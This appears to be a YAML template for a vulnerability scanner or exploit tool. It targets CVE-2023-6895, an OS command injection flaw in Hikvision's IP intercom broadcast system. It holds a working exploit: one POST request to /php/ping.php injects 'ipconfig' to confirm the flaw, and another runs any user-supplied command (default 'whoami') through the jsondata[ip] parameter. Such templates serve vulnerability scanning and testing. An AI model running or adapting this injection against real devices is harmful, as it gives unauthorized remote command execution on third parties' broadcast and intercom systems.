app: Hikvision
query: app:"Hikvision"
meta:
  name: CVE-2023-6895-海康威视对讲广播系统远程命令执行漏洞
  level: 4
  tags:
  - remote_code_execution
  description: 海康威视IP网络对讲广播系统3.0.3_20201113_RELEASE（HIK）中发现了漏洞。它被宣布为危急状态。此漏洞影响文件/php/ping.
    php的未知代码。使用输入netstat -ano操作参数jsondata[ip]会导致os命令注入。
  homepage: https://www.hikvision.com/cn/
  author: X prism
  references: ""
  solution: 升级到4.1.0版本可以解决这个问题。建议升级受影响的组件。
  create_at: "2024-07-12 14:54:52"
  available: true
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /php/ping.php
          redirect: true
          header:
          - Content-Type: application/x-www-form-urlencoded
          params: jsondata[type]=night&jsondata[ip]=ipconfig
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: '"Windows IP'
          type: contains
    exploit_steps:
      type: and
      params:
        name: CMD
        type: input
        value: whoami
      exploit:
      - request:
          method: POST
          path: /php/ping.php
          redirect: true
          header:
          - Content-Type: application/x-www-form-urlencoded
          params: jsondata[type]=night&jsondata[ip]={{exploit}}
        response:
        - name: code
          value: "200"
          type: equals
